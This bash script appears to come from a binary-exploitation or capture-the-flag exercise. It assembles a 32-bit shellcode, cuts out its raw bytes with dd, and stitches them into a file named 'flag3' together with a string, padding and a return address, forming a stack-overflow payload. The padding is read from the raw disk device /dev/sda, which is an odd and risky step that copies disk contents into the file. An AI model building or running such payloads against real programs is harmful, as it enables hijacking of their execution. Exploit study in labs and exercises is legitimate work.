#!/bin/bash
../../Assembler/tools/assembly_link_gnu.sh ./shellcode_printf.s 32
offset=116
shellcode_size=39
exploit_size=54
string_size=`stat --printf="%s" string_shellcode`
dd if=shellcode_printf  of=clean_shellcode\
 iflag=skip_bytes,count_bytes bs=1 skip=116 count=$shellcode_size
hexdump -C clean_shellcode
#cp flag2_ebp_ebx_ok flag3
dd conv=notrunc if=clean_shellcode of=flag3
#dd conv=notrunc if=/dev/zero of=string_shellcode seek=$string_size iflag=skip_bytes,count_bytes oflag=seek_bytes count=1
dd conv=notrunc if=string_shellcode of=flag3 seek=$shellcode_size\
 iflag=skip_bytes,count_bytes oflag=seek_bytes

dd conv=notrunc if=/dev/sda of=flag3 seek=`stat --printf="%s" flag3`\
 iflag=skip_bytes,count_bytes oflag=seek_bytes count=$exploit_size

dd conv=notrunc if=retaddr of=flag3 seek=`stat --printf="%s" flag3`\
 iflag=skip_bytes,count_bytes oflag=seek_bytes

#dd conv=swab,notrunc if=clean_shellcode of=flag3
